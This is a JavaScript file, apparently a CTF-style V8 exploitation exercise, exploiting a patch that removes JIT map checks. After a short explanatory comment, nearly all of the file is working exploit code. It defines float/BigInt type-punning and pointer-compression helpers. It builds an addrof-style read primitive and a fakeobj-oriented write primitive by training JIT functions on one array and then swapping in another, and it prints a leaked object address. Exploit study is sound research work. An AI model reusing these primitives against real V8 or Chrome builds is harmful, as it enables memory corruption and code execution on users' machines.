/*

  The patch seems to be in the JIT compiler. It removes calls to a function called "DeoptimizeIfNot" for a "check"
  composed of "TaggedEqual(value_map, map)". I'm assuming this is somewhat similar to a guard in luajit's JIT compiler,
  so a function gets JIT-compiled with certain specializations (Like a variable is assumed to be a constant, or of a certain type,
  an array or object structure or length is assumed, etc) that exit the JIT compiler when they are found to not
  be true. Some of the things it could then do are fall back to the interpreter or recompile with different assumptions 
  (And either keep both or remove the old one), but I don't know what things v8 actually does.

  My first idea was to write a couple of simple array read/write functions, "train" them with the JIT optimizer by running them
  a bunch of times with an array with a specific structure/layout (By which I mean v8 map), and then try using them with a
  completely different array. That didn't work (Maybe it was inlining it), but a bigger function that has the training part
  in it did. This file is that.

*/

// Utils, ftoi, itof, print hex
var buf = new ArrayBuffer(8);
// Views of buf for type punning
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);
function ftoi(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n);
}
// low 32 bits of number/float value in the low 32 bits of BigInt output
function ftoi_low32(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[0]);
}
// high 32 bits of number/float value in the low 32 bits of BigInt output
function ftoi_hi32(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[1]);
}
function itof(val) {
  u32_buf[0] = Number(val & 0xffffffffn);
  u32_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}
function print_hex(int) {
  console.log("0x" + int.toString(16).padStart(16, "0"));
}
function print_fptr(number) {
  print_hex(ftoi(number));
}
// Preserves high 32 bits
function compress_ptr(old_val, low_32bits_to_set) {
  return itof((ftoi_hi32(old_val) << 32n) + low_32bits_to_set);
}
// Preserves high 32 bits and applies the read offset used by JSArrays in reverse (-8 bytes)
function compress_elementptr(old_val, low_32bits_to_set) {
  // No idea why the -8n is needed (It's a 64bit/8byte offset). Length of the array stored before the elements?
  return compress_ptr(old_val, low_32bits_to_set - 8n);
}
// END UTILS

// idx must be 0..9
// Reads idx in read_arr as a float value (Trivial addrof for heap objects not stored in-line in the storage)
function fl_read(read_arr, idx) {
    function oob_read(idx, map) {
        return map[idx]
    }
    function oob_write(idx, val, map) {
        map[idx] = val
    }
    
    let arr = [1.01, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.10];
    for(let i=0; i< 100*100*100+1; i++) {
        if (i==100*100*100) {arr = read_arr}
        let val = oob_read(idx, arr)
        oob_write(idx, val, arr);
        if (i==100*100*100) {
            return val;
        }
    }
}

// idx must be 0..9
// Writes the write_val float at idx in read_arr as a float value without modifying write_arr's map
// I think this should let us make a fakeobj
function fl_write(write_arr, idx, write_val) {
    function oob_read(idx, map) {
        return map[idx]
    }
    function oob_write(idx, val, map) {
        map[idx] = val
    }
    
    let arr = [1.01, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.10];
    let val = arr[0]
    for(let i=0; i< 100*100*100+1; i++) {
        if (i==100*100*100) {arr = write_arr}
        val = oob_read(idx, arr)
        if (i==100*100*100) {
            val = write_val;
        }
        oob_write(idx, val, arr);
    }
}

let obj = {"a":3};
let obj_arr = [obj];
console.log("obj:");
%DebugPrint(obj);
console.log("fl_read(obj_arr, 0): (Should be the address of 'obj' above");
print_fptr(fl_read(obj_arr, 0))

while(true) {}